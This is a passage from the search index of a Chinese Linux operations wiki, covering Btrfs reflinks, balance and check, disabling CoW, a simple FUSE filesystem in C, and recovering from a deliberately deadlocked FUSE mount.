\u200b\u652f\u6301\u200b\u5f15\u7528\u200b\u590d\u5236\u200b\uff08reflink\uff09\u200b\u529f\u80fd\u200b\uff0c\u200b\u5728\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u6570\u636e\u200b\u5757\u200b\u3002\u200b\u4e0e\u200b\u786c\u200b\u94fe\u63a5\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4fee\u6539\u200b\uff08\u200b\u5199\u5165\u200b\uff09\u200b\u590d\u5236\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u88ab\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u590d\u5236\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u5e76\u200b\u4fee\u6539\u200b\u3002\u200b\u76ee\u524d\u200b\uff0c<code>cp</code> \u200b\u5de5\u5177\u200b\u652f\u6301\u200b\u6b64\u200b\u529f\u80fd\u200b\uff1a</p> <pre><code>cp -a --reflink=always /path/to/source /path/to/destination\n</code></pre>"},{"location":"ops/storage/filesystem/#btrfs-faq","title":"\u5e38\u89c1\u95ee\u9898","text":"Balance <p>\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\u662f\u200b\uff1a\u200b\u660e\u660e\u200b\u8fd8\u6709\u200b\u5269\u4f59\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u5df2\u7ecf\u200b\u65e0\u6cd5\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u4e86\u200b\u3002\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b Btrfs \u200b\u5185\u90e8\u200b\u5b58\u50a8\u200b\u5206\u4e3a\u200b\u6570\u636e\u200b\uff08Data\uff09\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\uff08Metadata\uff09\u200b\u7b49\u200b\u90e8\u5206\u200b\uff0c\u200b\u5f53\u200b\u4e24\u8005\u200b\u4efb\u4e00\u200b\u5df2\u6ee1\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u672a\u200b\u5206\u914d\u200b\uff08Unallocated\uff09\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u518d\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u4e86\u200b\u3002\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6267\u884c\u200b <code>btrfs filesystem usage</code> \u200b\u5224\u65ad\u200b\uff1a</p> <pre><code>$ sudo btrfs filesystem usage /\nOverall:\n    Device size:           1.81TiB\n    Device allocated:          1.66TiB\n    Device unallocated:      156.45GiB\n    Device missing:          0.00B\n    Device slack:            0.00B\n    Used:              1.39TiB\n    Free (estimated):        414.79GiB  (min: 336.57GiB)\n    Free (statfs, df):       414.79GiB\n    Data ratio:               1.00\n    Metadata ratio:           2.00\n    Global reserve:      512.00MiB  (used: 0.00B)\n    Multiple profiles:              no\n\nData,single: Size:1.62TiB, Used:1.37TiB (84.43%)\n/dev/nvme0n1p3     1.62TiB\n\nMetadata,DUP: Size:18.00GiB, Used:11.54GiB (64.13%)\n/dev/nvme0n1p3    36.00GiB\n\nSystem,DUP: Size:8.00MiB, Used:208.00KiB (2.54%)\n/dev/nvme0n1p3    16.00MiB\n\nUnallocated:\n/dev/nvme0n1p3   156.45GiB\n</code></pre> <p>\u200b\u9664\u4e86\u200b\u76f4\u63a5\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>truncate</code> \u200b\u5c06\u200b\u5927\u200b\u6587\u4ef6\u200b\u7684\u200b\u5927\u5c0f\u200b\u622a\u65ad\u200b\u4e3a\u200b 0 \u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0d\u200b\u6dfb\u52a0\u200b metadata \u200b\u4fe1\u606f\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u91ca\u653e\u200b\u7a7a\u95f4\u200b\u3002 \u200b\u5982\u679c\u200b metadata \u200b\u5df2\u6ee1\u200b\uff0c\u200b\u4f46\u662f\u200b data \u200b\u4ecd\u200b\u6709\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b balance \u200b\u529f\u80fd\u200b\u91cd\u65b0\u5206\u914d\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>$ sudo btrfs balance start /mountpoint -dusage=0\n</code></pre> <p><code>-dusage=0</code> \u200b\u4ee3\u8868\u200b\u5c06\u200b data \u200b\u4e2d\u200b\u6ca1\u6709\u200b\u4f7f\u7528\u200b\uff08\u200b\u4f7f\u7528\u7387\u200b\u4e3a\u200b 0%\uff09\u200b\u7684\u200b\u7a7a\u95f4\u200b\u91ca\u653e\u200b\u3002\u200b\u89c6\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6709\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u589e\u5927\u200b <code>-dusage</code> \u200b\u53c2\u6570\u200b\u7684\u200b\u503c\u200b\u3002 \u200b\u5982\u679c\u200b\u5728\u200b balance \u200b\u65f6\u200b\u63d0\u793a\u200b\u6ca1\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u80fd\u200b\u4e0d\u5f97\u4e0d\u200b\u9700\u8981\u200b\u4e34\u65f6\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u78c1\u76d8\u200b\uff08\u200b\u6bd4\u5982\u200b\u4e00\u4e2a\u200b U \u200b\u76d8\u200b\uff0c\u200b\u6216\u8005\u200b\u5982\u679c\u200b\u80fd\u591f\u200b\u627f\u62c5\u200b \u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u7684\u200b\u98ce\u9669\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u76d8\u200b\uff09\uff0c\u200b\u6dfb\u52a0\u200b\u8bbe\u5907\u200b\u540e\u200b\u518d\u200b\u6267\u884c\u200b balance\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u79fb\u9664\u200b\u8bbe\u5907\u200b\u3002</p> Check <p>Btrfs \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u68c0\u67e5\u200b\u5de5\u5177\u200b <code>btrfs-check</code> \u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u6587\u4ef6\u7cfb\u7edf\u200b fsck \u200b\u7684\u200b\u5e73\u66ff\u200b\u3002 \u200b\u5bf9\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u7684\u200b Btrfs \u200b\u5206\u533a\u200b\u4f7f\u7528\u200b <code>btrfs-check</code> \u200b\u7684\u200b <code>--repair</code> \u200b\u9009\u9879\u200b\u5f88\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u5efa\u8bae\u200b\u8bbe\u7f6e\u200b\u5b9a\u65f6\u200b scrub \u200b\u4efb\u52a1\u200b\uff0c\u200b\u4ee5\u200b\u68c0\u67e5\u200b checksum \u200b\u4e0e\u200b\u5b9e\u9645\u200b\u5185\u5bb9\u200b\u662f\u5426\u200b\u4e00\u81f4\u200b\u3002Scrub \u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u6267\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u68c0\u67e5\u200b\u7ed3\u6784\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\u3002</p> \u200b\u5173\u95ed\u200b CoW <p>\u200b\u5bf9\u4e8e\u200b\u90e8\u5206\u200b\u5e94\u7528\u200b\u573a\u666f\u200b\uff08\u200b\u4f8b\u5982\u200b\u6570\u636e\u5e93\u200b\u3001\u200b\u865a\u62df\u673a\u200b\u955c\u50cf\u200b\uff09\uff0cBtrfs \u200b\u7684\u200b CoW \u200b\u7279\u6027\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5e26\u6765\u200b\u6027\u80fd\u200b\u95ee\u9898\u200b\u3002\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u4f7f\u7528\u200b <code>chattr +C</code> \u200b\u547d\u4ee4\u200b\u5173\u95ed\u200b CoW \u200b\u7279\u6027\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#zfs","title":"ZFS","text":"<p>\u200b\u53c2\u89c1\u200b ZFS\u3002</p>"},{"location":"ops/storage/filesystem/#fuse","title":"FUSE","text":"<p>FUSE \u200b\u662f\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u4f9d\u8d56\u4e8e\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b <code>libfuse</code> \u200b\u5e93\u200b\u4e0e\u200b\u5185\u6838\u200b\u7684\u200b <code>fuse</code> \u200b\u6a21\u5757\u200b\uff08\u200b\u5bf9\u5e94\u200b <code>/dev/fuse</code> \u200b\u8bbe\u5907\u200b\uff09\u3002\u200b\u76ee\u524d\u200b\u5728\u200b\u5e38\u89c1\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6ce8\u610f\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b FUSE \u200b\u5e93\u6709\u200b\u4e24\u4e2a\u200b\u7248\u672c\u200b\uff1a<code>fuse2</code>\uff08<code>fuse</code>\uff09\u200b\u548c\u200b <code>fuse3</code>\u3002\u200b\u4e00\u90e8\u5206\u200b\u65e7\u200b\u7a0b\u5e8f\u200b\u4ecd\u7136\u200b\u4f9d\u8d56\u4e8e\u200b <code>fuse2</code>\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u5df2\u7ecf\u200b\u591a\u5e74\u200b\u672a\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u65b0\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u5e94\u5f53\u200b\u5c3d\u91cf\u200b\u4f7f\u7528\u200b <code>fuse3</code>\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b FUSE \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5305\u62ec\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b NTFS \u200b\u5b9e\u73b0\u200b\uff08NTFS-3G\uff09\u3001\u200b\u7f51\u76d8\u200b/\u200b\u5bf9\u8c61\u200b\u5b58\u50a8\u200b\u7684\u200b\u6302\u8f7d\u200b\uff08\u200b\u4f8b\u5982\u200b S3FS\uff09\u3001SSHFS \u200b\u7b49\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4f60\u200b\u559c\u6b22\u200b\u7684\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\u7f16\u5199\u200b FUSE \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4ee5\u200b C \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5728\u200b\u5b98\u65b9\u200b\u7684\u200b example/hello.c \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u7b80\u5316\u200b\u3002\u200b\u5728\u200b\u5b89\u88c5\u200b <code>libfuse3-dev</code> \u200b\u4e4b\u540e\u200b\u7f16\u5199\u200b\u4ee5\u4e0b\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>#define FUSE_USE_VERSION 31\n\n#include &lt;errno.h&gt;\n#include &lt;fuse.h&gt;\n#include &lt;string.h&gt;\n\nstatic const char *filename = \"hello\";\nstatic const char *contents = \"Hello, world!\\n\";\n\nstatic int hello_getattr(const char *path, struct stat *stbuf,\n                         struct fuse_file_info *fi) {\n  int res = 0;\n\n  memset(stbuf, 0, sizeof(struct stat));\n  if (strcmp(path, \"/\") == 0) {\n    stbuf-&gt;st_mode = S_IFDIR | 0755;\n    stbuf-&gt;st_nlink = 2;\n  } else if (strcmp(path + 1, filename) == 0) {\n    stbuf-&gt;st_mode = S_IFREG | 0444;\n    stbuf-&gt;st_nlink = 1;\n    stbuf-&gt;st_size = strlen(contents);\n  } else {\n    res = -ENOENT;\n  }\n  return res;\n}\n\nstatic int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler,\n                         off_t offset, struct fuse_file_info *fi,\n                         enum fuse_readdir_flags flags) {\n  if (strcmp(path, \"/\") != 0)\n    return -ENOENT;\n\n  filler(buf, \".\", NULL, 0, 0);\n  filler(buf, \"..\", NULL, 0, 0);\n  filler(buf, filename, NULL, 0, 0);\n\n  return 0;\n}\n\nstatic int hello_open(const char *path, struct fuse_file_info *fi) {\n  if (strcmp(path + 1, filename) != 0)\n    return -ENOENT;\n\n  if ((fi-&gt;flags &amp; O_ACCMODE) != O_RDONLY)\n    return -EACCES;\n\n  return 0;\n}\n\nstatic int hello_read(const char *path, char *buf, size_t size, off_t offset,\n                      struct fuse_file_info *fi) {\n  size_t len;\n  if (strcmp(path + 1, filename) != 0)\n    return -ENOENT;\n\n  len = strlen(contents);\n  if (offset &lt; len) {\n    if (offset + size &gt; len) {\n      size = len - offset;\n    }\n    memcpy(buf, contents + offset, size);\n  } else {\n    size = 0;\n  }\n\n  return size;\n}\n\nstatic const struct fuse_operations hello_oper = {\n    .getattr = hello_getattr,\n    .readdir = hello_readdir,\n    .open = hello_open,\n    .read = hello_read,\n};\n\nint main(int argc, char *argv[]) {\n  return fuse_main(argc, argv, &amp;hello_oper, NULL);\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u81ea\u5236\u200b\u300c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u300d\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u4e2a\u200b\u65b9\u6cd5\u200b\uff1a<code>getattr</code>\uff08\u200b\u83b7\u53d6\u200b\u6587\u4ef6\u5c5e\u6027\u200b\uff09\u3001<code>readdir</code>\uff08\u200b\u8bfb\u53d6\u200b\u76ee\u5f55\u200b\uff09\u3001<code>open</code>\uff08\u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b\uff09\u200b\u548c\u200b <code>read</code>\uff08\u200b\u8bfb\u53d6\u200b\u6587\u4ef6\u200b\uff09\uff0c\u200b\u5728\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u865a\u62df\u200b\u51fa\u200b\u4e86\u200b\u4e00\u4e2a\u200b <code>hello</code> \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u7f16\u8bd1\u200b\u6267\u884c\u200b\uff1a</p> <pre><code>gcc fuse.c -Wall $(pkg-config fuse3 --cflags --libs) -o fuse\nmkdir -p mountpoint\n./fuse mountpoint\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b <code>mountpoint</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u591a\u51fa\u200b\u4e86\u200b\u6211\u4eec\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>$ ls mountpoint/\nhello\n$ cat mountpoint/hello \nHello, world!\n</code></pre> <p>\u200b\u5b8c\u6210\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u89e3\u9664\u200b\u6302\u8f7d\u200b\uff1a</p> <pre><code># fusermount \u200b\u4e0d\u200b\u9700\u8981\u200b root \u200b\u6743\u9650\u200b\nfusermount -u mountpoint/\n# \u200b\u6216\u8005\u200b umount\uff0c\u200b\u65e7\u7248\u672c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b root \u200b\u6743\u9650\u200b\n# umount mountpoint/\n</code></pre> <p>FUSE \u200b\u7684\u200b\u4ee3\u4ef7\u200b</p> <p>\u200b\u7528\u6237\u200b\u6001\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u867d\u7136\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u4ee3\u4ef7\u200b\u4e4b\u4e00\u200b\u662f\u200b\u6027\u80fd\u200b\u3002FAST '17 \u200b\u7684\u200b\u8bba\u6587\u200b To FUSE or Not to FUSE: Performance of User-Space File Systems \u200b\u5bf9\u6b64\u200b\u505a\u200b\u4e86\u200b\u8be6\u7ec6\u200b\u7684\u200b\u91cf\u5316\u200b\u5206\u6790\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cFUSE \u200b\u5728\u200b\u5141\u8bb8\u200b\u4efb\u610f\u200b\u7528\u6237\u200b\u8bbf\u95ee\u200b\u6302\u8f7d\u200b\u70b9\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u5e94\u7528\u200b\u5b9a\u4e49\u200b ACL \u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5b58\u5728\u200b\u6f5c\u5728\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff0c\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4f7f\u7528\u200b\u65f6\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u3002</p> <p>\u200b\u89e3\u51b3\u200b FUSE \u200b\u6b7b\u9501\u200b\u95ee\u9898\u200b</p> <p>\u200b\u4e00\u4e9b\u200b\u5b9e\u73b0\u200b\u4e0d\u4f73\u200b\u7684\u200b FUSE \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u8fdb\u7a0b\u200b\u548c\u200b\u8bbf\u95ee\u200b\u8be5\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u4f1a\u200b\u9677\u5165\u200b\u5185\u6838\u200b\u4e2d\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7528\u200b\u5e38\u7528\u200b\u7684\u200b SIGKILL \u200b\u4fe1\u53f7\u200b\u7ec8\u6b62\u200b\u3002</p> \u200b\u4e00\u4e2a\u200b\u6b7b\u9501\u200b\u7684\u200b\u4ee3\u7801\u200b\u4f8b\u5b50\u200b\uff1aFUSE \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5b9e\u73b0\u200b\u8bbf\u95ee\u200b\u81ea\u8eab\u200b\u7684\u200b\u8def\u5f84\u200b <pre><code>#define FUSE_USE_VERSION 31\n\n#include &lt;assert.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fuse.h&gt;\n#include &lt;string.h&gt;\n#include &lt;dirent.h&gt;\n\nstatic char *real_path = NULL;\n\nstatic int hello_getattr(const char *path, struct stat *stbuf,\n                        struct fuse_file_info *fi) {\n  int res = 0;\n\n  memset(stbuf, 0, sizeof(struct stat));\n  // DEADLOCK!\n  // Accessing myself in the getattr function\n  DIR *d = opendir(real_path);\n  struct dirent *entry = readdir(d);\n  // OK, impossible to reach here\n  assert(0);\n  return res;\n}\n\nstatic const struct fuse_operations hello_oper = {\n  .getattr = hello_getattr,\n};\n\nint main(int argc, char *argv[]) {\n  if (argc &lt; 2) {\n    fprintf(stderr, \"Usage: %s &lt;mountpoint&gt;\\n\", argv[0]);\n    return 1;\n  }\n  real_path = realpath(argv[1], NULL);\n  return fuse_main(argc, argv, &amp;hello_oper, NULL);\n}\n</code></pre> <p>\u200b\u4e0a\u8ff0\u200b\u7a0b\u5e8f\u200b\u5728\u200b\u8fd0\u884c\u200b\u540e\u200b\uff0c\u200b\u8bbf\u95ee\u200b\u8def\u5f84\u200b\u4f1a\u200b\u5361\u6b7b\u200b\uff0c\u200b\u8be5\u200b\u8fdb\u7a0b\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u88ab\u200b wait \u200b\u56de\u6536\u200b\uff0c\u200b\u6302\u8f7d\u200b\u70b9\u200b\u4e5f\u200b\u65e0\u6cd5\u200b umount\uff1a</p> <pre><code>$ ./deadlock mountpoint/\n$ ls mountpoint/\n\uff08\u200b\u5361\u4f4f\u200b\uff09\n</code></pre> <pre><code>$ ps aux | grep deadlock\nusername     150911  0.0  0.0 748452  1584 ?        Ssl  16:09   0:00 ./deadlock mountpoint/\nusername     151414  0.0  0.0   9556  5960 pts/3    S+   16:10   0:00 grep --color=auto deadlock\n$ kill -9 150911\n$ ps aux | grep deadlock\nusername     150911  0.0  0.0      0     0 ?        Zsl  16:09   0:00 [deadlock] &lt;defunct&gt;\nusername     151555  0.0  0.0   9556  5804 pts/3    S+   16:12   0:00 grep --color=auto deadlock\n$ fusermount -u mountpoint/\nfusermount: failed to unmount /path/to/mountpoint: Device or resource busy\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u5185\u6838\u200b FUSE \u200b\u66b4\u9732\u200b\u7684\u200b\u63a7\u5236\u200b\u63a5\u53e3\u200b\u5f3a\u5236\u200b\u5173\u95ed\u200b\u8fde\u63a5\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53c2\u89c1\u200b\u5185\u6838\u200b\u6587\u6863\u200b\u4e2d\u200b FUSE \u200b\u7684\u200b\u4ecb\u7ecd\u200b\uff1a</p> <pre><code>$ ls /sys/fs/fuse/connections/\n1292/  1327/  1381/\n$ cat /sys/fs/fuse/connections/1381/waiting\n21\n$ # waiting \u200b\u7684\u200b\u503c\u200b\u975e\u200b 0\uff0c\u200b\u8868\u660e\u200b\u73b0\u5728\u200b 1381 \u200b\u8fde\u63a5\u200b\u6709\u200b\u8fdb\u7a0b\u200b\u5728\u200b\u7b49\u5f85\u200b\n$ # \u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b waiting \u200b\u7684\u200b\u503c\u200b\u5e94\u8be5\u200b\u662f\u200b 0\uff0c\u200b\u5982\u679c\u200b\u6301\u7eed\u200b\u4e3a\u200b\u975e\u200b 0\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u4e86\u200b\u8fde\u63a5\u200b\u5361\u6b7b\u200b\u7684\u200b\u95ee\u9898\u200b\n$ echo 1 | sudo tee /sys/fs/fuse/connections/1381/abort\n1\n$ fusermount -u mountpoint/\n</code></pre>"},{"location":"ops/storage/filesystem/#references","title":"\u5f15\u7528\u200b\u6765\u6e90","text":"<ul> <li>Device file (Arch Wiki)</li> <li>Device file (Wikipedia)</li> </ul> <ol> <li> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u300c\u200b\u6247\u533a\u200b\u300d\u200b\u7684\u200b\u6982\u5ff5\u200b\u5728\u200b\u73b0\u4ee3\u200b\u78c1\u76d8\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u4e0a\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u51c6\u786e\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u4ecd\u7136\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u4e60\u60ef\u6027\u200b\u7684\u200b\u672f\u8bed\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>\u200b\u6247\u533a\u200b\u7684\u200b\u5927\u5c0f\u200b\uff08\u200b\u7279\u522b\u200b\u662f\u200b\u73b0\u4ee3\u200b\u78c1\u76d8\u200b\u5728\u200b\u5b9e\u9645\u200b\u7269\u7406\u200b\u4e0a\u200b\uff09\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u662f\u200b 512 \u200b\u5b57\u8282\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b\u5b9e\u9645\u200b\u521b\u5efa\u200b\u5206\u533a\u200b\u65f6\u200b\uff0c\u200b\u4e00\u822c\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200b 512 \u200b\u5b57\u8282\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>The Boot Loader Specification \u21a9</p> </li> <li> <p>xfs_growfs(8): A filesystem with only 1 AG cannot be shrunk further, and a filesystem cannot be shrunk to the point where it would only have 1 AG.\u00a0\u21a9</p> </li> <li> <p>OpenZFS on Windows \u200b\u9879\u76ee\u200b\u5df2\u7ecf\u200b\u6709\u4e9b\u200b\u5e74\u5934\u200b\u4e86\u200b\uff0c\u200b\u4f46\u200b\u5176\u200b\u4ecd\u7136\u200b\u4e3a\u200b Beta \u200b\u72b6\u6001\u200b\uff0c\u200b\u867d\u7136\u200b\u4e00\u822c\u200b\u4e0d\u4f1a\u200b\u53d1\u751f\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u200b\u4ecd\u7136\u200b\u5b58\u5728\u200b\u7cfb\u7edf\u200b\u5d29\u6e83\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u200b\u63a8\u8350\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4f7f\u7528\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/storage/intro/","title":"\u57fa\u7840\u77e5\u8bc6\u200b\u7b80\u4ecb","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@iBug\u3001@TheRainstorm</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u670d\u52a1\u5668\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u7684\u200b\u5b58\u50a8\u200b\u65b9\u6848\u200b\u4e0e\u200b\u4e2a\u4eba\u200b\u8ba1\u7b97\u673a\u200b\u7684\u200b\u5dee\u5f02\u200b\u8f83\u5927\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>\u200b\u670d\u52a1\u5668\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5927\u91cf\u200b\u7684\u200b\u76d8\u4f4d\u200b\uff0c\u200b\u4e0d\u540c\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u76d8\u4f4d\u200b\u4f7f\u7528\u200b\u7684\u200b\u63a5\u53e3\u200b\u3001\u200b\u78c1\u76d8\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u53ef\u80fd\u200b\u4e0d\u540c\u200b\u3002</li> <li>\u200b\u670d\u52a1\u5668\u200b\u4e00\u822c\u200b\u63d0\u4f9b\u200b RAID \u200b\u5361\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u786c\u4ef6\u200b\u5c42\u9762\u200b\u5b9e\u73b0\u200b RAID \u200b\u529f\u80fd\u200b\uff0c\u200b\u5927\u90e8\u5206\u200b RAID \u200b\u5361\u200b\u4e5f\u200b\u5141\u8bb8\u200b\u7ba1\u7406\u5458\u200b\u8bbe\u7f6e\u200b\u76f4\u901a\u200b\u5230\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u7531\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5b9e\u73b0\u200b RAID \u200b\u529f\u80fd\u200b\u3002</li> <li>\u200b\u6839\u636e\u200b\u5de5\u4f5c\u200b\u8d1f\u8f7d\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u4e0d\u540c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5dee\u5f02\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9009\u62e9\u200b\u5408\u9002\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002</li> <li>\u200b\u7531\u4e8e\u200b\u78c1\u76d8\u200b\u6570\u91cf\u200b\u591a\u200b\uff0c\u200b\u78c1\u76d8\u200b\u6545\u969c\u200b\u7684\u200b\u6982\u7387\u200b\u4e5f\u200b\u4f1a\u200b\u589e\u52a0\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u53ca\u65f6\u53d1\u73b0\u200b\u6545\u969c\u200b\uff0c\u200b\u5e76\u200b\u91c7\u53d6\u76f8\u5e94\u200b\u7684\u200b\u63aa\u65bd\u200b\u3002</li> <li>\u2026\u2026\u2026\u2026</li> </ul> 